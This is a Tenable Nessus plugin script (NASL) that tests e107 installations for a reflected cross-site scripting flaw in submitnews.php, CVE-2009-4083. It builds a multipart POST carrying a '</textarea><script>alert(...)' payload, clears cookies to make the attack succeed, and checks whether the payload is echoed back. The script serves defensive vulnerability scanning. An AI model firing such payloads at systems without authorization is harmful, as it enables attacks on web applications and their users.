#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(43099);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2016/10/10 15:57:05 $");

  script_cve_id("CVE-2009-4083");
  script_bugtraq_id(37087);
  script_osvdb_id(60819);

  script_name(english:"e107 submitnews.php XSS");
  script_summary(english:"Attempts a non-persistent XSS attack on submitnews.php");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A PHP script on the remote web server is affected by a cross-site
scripting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of e107 on the remote host is affected by a cross-site
scripting vulnerability because the 'submitnews.php' script fails to
properly sanitize user-supplied input.  A remote attacker can exploit
this by tricking a user into making a specially crafted POST request.

There are reportedly several other cross-site scripting and SQL
injection vulnerabilities in this version of e107, though Nessus has
not checked for them."
  );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2009/Nov/152");
  script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(79);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/11/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/12/10");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:e107:e107");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("e107_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/e107");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");
include("audit.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'e107', port:port, exit_on_fail:TRUE);

# Make sure the page exists before POSTing
dir = install['dir'];
install_url = build_url(qs:dir, port:port);

url = '/submitnews.php';
res = http_send_recv3(method:"GET", item:dir+url, port:port, exit_on_fail:TRUE);

if (
  ('Submit News</title>' >!< res[2]) &&
  ('<title>Submit News' >!< res[2])
)
{
  exit(0, "The 'submitnews.php' script was not found on the e107 install at " +
  install_url + ".");
}

# Create and issue the POST request to exploit
alert_msg = SCRIPT_NAME + '-' + unixtime();
xss = "</textarea><script>alert('" + alert_msg + "')</script><textarea>";

boundary = '--Nessus';
boundary2 = '--' + boundary;
headers = make_array(
  'Content-Type',
  'multipart/form-data; boundary=--Nessus'
);
postdata =
  boundary2 + '\r\n' +
  'Content-Disposition: form-data; name="submitnews_item"\r\n\r\n' +
  xss + '\r\n' +
  boundary2 + '--\r\n';

# Destroy the cookie set from first request to submitnews.php in
# order for attack to succeed in later versions of the application.
clear_cookiejar();

res2 = http_send_recv3(
  method : "POST",
  item   : dir + url,
  port   : port,
  data   : postdata,
  add_headers  : headers,
  exit_on_fail : TRUE
);
exp_output = '>' + xss + '</textarea>';

if (exp_output >< res2[2])
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);
  output = extract_pattern_from_resp(string:res2[2], pattern:'ST:'+exp_output);

  if (report_verbosity > 0)
  {
    snip = crap(data:"-", length:30)+' snip '+crap(data:"-", length:30)+'\n';
    report =
      'Nessus was able to exploit the issue using the following request :' +
      '\n' +
      '\n' + http_last_sent_request() +
      '\n';
    if (report_verbosity > 1)
    {
      report +=
        '\n' + 'This produced the following response :' +
        '\n' +
        '\n' + snip +
        '\n' + chomp(output) +
        '\n' + snip +
        '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "e107", install_url);
